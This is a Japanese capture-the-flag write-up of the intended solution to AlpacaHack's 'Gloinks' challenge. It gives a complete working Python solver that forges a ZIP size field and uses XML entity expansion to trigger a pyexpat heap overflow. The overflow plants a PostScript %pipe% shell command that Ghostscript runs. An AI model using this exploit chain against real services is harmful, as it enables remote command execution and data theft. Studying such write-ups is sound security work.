# Gloinks writeup

## 背景

[Gloinks](https://alpacahack.com/daily-bside/challenges/gloinks) は AlpacaHack Daily B-side の問題です。

この問題は解答期間中には解き切れず、正答者の writeup を待っていました。
その後、[garume さん](https://alpacahack.com/users/garume) の
[Qiita の writeup](https://qiita.com/garume/items/90629dcd57760a93ac1c) を読み、
libmagic を使った解法に感心していました。

しかし、作問者である [ptr-yudai さん](https://alpacahack.com/users/ptr-yudai) の
[投稿](https://x.com/ptrYudai/status/2066787255038189669) で、
多くの solve は libmagic を使った非想定解であり、想定解は Python の memory corruption bug を使うものであったと知りました。
そこで、想定解の方針で解き直した内容をまとめます。

## 方針

このアプリでは `/tmp/previews` 以下のファイルを `/previews/<name>` から取得できます。
そのため、flag を `/tmp/previews/pc` に書き出せれば、あとは `/previews/pc` を読むだけです。

```text
/flag-*.txt -> /tmp/previews/pc
GET /previews/pc
```

配布 Dockerfile では ImageMagick の PS/PDF 系 policy が外され、Ghostscript も
`-dNOSAFER` で動くように変更されています。PostScript を ImageMagick に読ませられれば、
Ghostscript の `%pipe%` から shell command を実行できます。

使う PostScript はこれです。

```postscript
(%pipe%cat /flag-*.txt>/tmp/previews/pc) (r) file
```

以降は、この PostScript を ImageMagick が読む入力ファイルへ書き込むことを目標にします。

## 書き換える対象

`/api/render` は ZIP を受け取り、`manifest.xml` と画像 asset を処理します。
重要なのは、画像 asset を `image` bytearray に読み込んだあとで `manifest.xml` を parse し、
最後に `image` をファイルへ書き出す順番です。

```python
image = bytearray(MAX_ASSET)

with zf.open(asset) as f:
    f.readinto(image)

p.Parse(data, True)

with open(input_path, "wb") as f:
    f.write(image)
```

つまり `p.Parse()` の途中で隣接 heap にある `image` bytearray を壊せれば、
アプリは壊れた内容をそのまま保存します。

## PostScript として保存させる

保存先の suffix は ZIP 内 asset の拡張子から決まります。

```python
source = os.path.basename(asset.filename) or "image.bin"
suffix = os.path.splitext(source)[1] or ".input"
input_path = f"{ASSET_DIR}/{token}{suffix}"
```

asset 名を `a.PS` にすると、保存先は `/tmp/previews/<token>.PS` になります。
ただし、アプリは asset の先頭 2048 bytes を `python-magic` で確認しており、
`image/png` または `image/jpeg` でないと弾きます。

```python
header = f.read(2048)
if magic.from_buffer(header, mime=True) not in ALLOWED_MIME:
    raise ValueError("unsupported image format")
```

そこで asset の中身は、`python-magic` が JPEG と判定する短い prefix だけにします。

```python
zf.writestr("a.PS", b"\xff\xd8\xff\xe0\x00\x10")
```

MIME check はこれで通ります。実際に保存される `image` の中身は、
後で pyexpat の memory corruption によって PostScript に書き換えます。

## pyexpat のバグ

使うのは CPython issue
[#148441: Heap Buffer Overflow in pyexpat Character Data Buffering](https://github.com/python/cpython/issues/148441)
で報告されている pyexpat の heap buffer overflow です。

脆弱な処理は概念的には次の形です。

```c
if ((self->buffer_used + len) > self->buffer_size) {
    flush_character_buffer(self);
}
memcpy(self->buffer + self->buffer_used, data, len);
self->buffer_used += len;
```

`buffer_used + len` が 32bit signed int として overflow すると、flush 判定をすり抜けたまま
`memcpy()` が実行され、pyexpat の character data buffer の外へ書き込めます。

このバグを踏むには、次の状態が必要です。

- `buffer_text=True`
- `CharacterDataHandler` が設定されている
- `buffer_size` が `INT_MAX = 2^31 - 1` 付近
- `buffer_used` が `INT_MAX` 付近
- さらに大きめの character data を追加する

Gloinks では、最初の 2 つはアプリ側ですでに満たされています。

```python
p.buffer_text = True
p.CharacterDataHandler = lambda _data: None
```

残りの `buffer_size` と `buffer_used` を payload 側で作ります。

## buffer_size を大きくする

アプリは `ZipInfo.file_size` から pyexpat の `buffer_size` を設定しています。

```python
p.buffer_size = max(8192, info.file_size)
```

そこで、ZIP central directory にある `manifest.xml` の uncompressed size を
`INT_MAX` に書き換えます。

```python
i = data.index(b"PK\x01\x02")
data[i + 24 : i + 28] = INT_MAX.to_bytes(4, "little")
```

この header では offset `24..28` が uncompressed size なので、ここを `INT_MAX` にします。
solver が `manifest.xml` を最初に `writestr()` しているため、最初の central directory entry が
`manifest.xml` になります。

これにより、アプリから見る `info.file_size` は `INT_MAX` になり、
`p.buffer_size` も `INT_MAX` になります。一方、実際に `zf.read(info)` が返す XML は
ZIP に入っている実データだけです。

これで、約 2 GiB の XML を実際に送らずに、pyexpat の buffer limit だけを大きくできます。
ここでの約 2 GiB は `INT_MAX = 2^31 - 1` bytes のことです。

## buffer_used を進める

次は `&x;` の直前で `buffer_used == INT_MAX` にします。
実際に 2 GiB 近い XML を送ると、`zf.read(info)` が展開後 XML 全体を Python の `bytes`
として持つため、リモートではメモリ制限に当たります。

そこで XML entity 展開を使います。

```xml
<!ENTITY fffff... "AAAA....">
```

本文に `&fffff...;` と書くと、pyexpat はそれを `"AAAA...."` として処理します。
solver では `"A" * 8192` に展開される entity を作り、その参照を大量に並べています。
`manifest.xml` 自体にも大量の entity 参照が入りますが、同じ文字列の繰り返しなので
ZIP 圧縮後の upload size は小さく保てます。

```python
FILLER_UNIT = 8192
ENTITY_NAME_LEN = 128

filler = b"A" * FILLER_UNIT
name = b"f" * ENTITY_NAME_LEN
ref = b"&" + name + b";"
q, r = divmod(INT_MAX, FILLER_UNIT)
```

entity 名を長くしているのは、Expat の入力増幅率制限を避けるためです。
短すぎる参照から大きな出力を作ると、Expat が entity expansion を止めます。

## 書き込む内容

overflow で `image` に書き込む内容を entity `x` として用意します。

```python
SLED = 65536
ps = b"(\\045pipe\\045cat /flag-*.txt>/tmp/previews/pc) (r) file"
payload = b" " * SLED + ps
```

`\045` は PostScript 文字列中で `%` を表す octal escape です。
DTD entity 内に `%` を直接置くと XML の parameter entity と衝突しやすいため、
solver ではこの形で `%pipe%` を書いています。

pyexpat buffer の終端から `image` bytearray 先頭までには少し距離があります。
正確な距離を測って padding してもよいですが、この solver では使いません。
entity `x` の先頭に十分長い空白を置きます。

PostScript は先頭の空白を読み飛ばします。そのため、`image` の先頭が空白領域の途中になっても、
後ろの PostScript まで到達できます。`SLED = 65536` はこの距離を覆うための余裕です。
同じ文字の繰り返しなので、ZIP 圧縮後のサイズはほとんど増えません。

最後に XML 本文を組み立てます。

```python
header = b'<!DOCTYPE convert [<!ENTITY %s "%s"><!ENTITY x "%s">]><convert>' % (
    name,
    filler,
    payload,
)
xml = header + ref * q + b"A" * r + b"&x;<"
```

`ref * q + b"A" * r` が `INT_MAX` bytes 分の character data になります。
続く `&x;` の処理で `buffer_used + len(payload)` が signed int overflow し、
entity `x` の内容が pyexpat buffer の外へ書き込まれます。

末尾の `<` は XML として不正なので、`p.Parse()` は `ExpatError` で止まります。
parse 成功時の終了処理まで進むと、壊れた状態をさらに触って worker が落ち、
`image` の保存まで到達できません。

アプリは `ExpatError` を捕捉して処理を続けるので、memory corruption 後も
`image` の保存まで進みます。

```python
try:
    p.Parse(data, True)
except expat.ExpatError:
    pass
```

その後、アプリは壊れた `image` を `/tmp/previews/<token>.PS` に保存します。
ImageMagick は `.PS` としてそれを読み、Ghostscript が `%pipe%cat /flag-*.txt>/tmp/previews/pc`
を実行します。最後に `/previews/pc` を読めば flag が得られます。

## solver

solver は次の通りです。

```python
import io
import sys
import zipfile

import requests


INT_MAX = 2**31 - 1
TARGET = "pc"
SLED = 65536
FILLER_UNIT = 8192
ENTITY_NAME_LEN = 128


def make_xml():
    filler = b"A" * FILLER_UNIT
    name = b"f" * ENTITY_NAME_LEN
    ref = b"&" + name + b";"
    ps = f"(\\045pipe\\045cat /flag-*.txt>/tmp/previews/{TARGET}) (r) file".encode()
    payload = b" " * SLED + ps

    header = b'<!DOCTYPE convert [<!ENTITY %s "%s"><!ENTITY x "%s">]><convert>' % (name, filler, payload)

    q, r = divmod(INT_MAX, FILLER_UNIT)
    return header + ref * q + b"A" * r + b"&x;<"


def forge_size(zip_bytes):
    data = bytearray(zip_bytes)
    i = data.index(b"PK\x01\x02")
    data[i + 24 : i + 28] = INT_MAX.to_bytes(4, "little")
    return bytes(data)


def make_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_BZIP2) as zf:
        zf.writestr("manifest.xml", make_xml())
        zf.writestr("a.PS", b"\xff\xd8\xff\xe0\x00\x10")
    return forge_size(buf.getvalue())


def send_payload(base):
    try:
        requests.post(base + "/api/render", data=make_zip(), timeout=20)
    except requests.RequestException:
        pass


def main():
    base = sys.argv[1].rstrip("/")
    send_payload(base)
    print(requests.get(base + f"/previews/{TARGET}", timeout=2).text.strip())


if __name__ == "__main__":
    main()
```

実行は次の形です。

```bash
python3 solve.py http://<host>:<port>
```

<details>
<summary>flag</summary>

```text
Alpaca{m3M0ry_s4f3TY_1s_a_Li3}
```

</details>
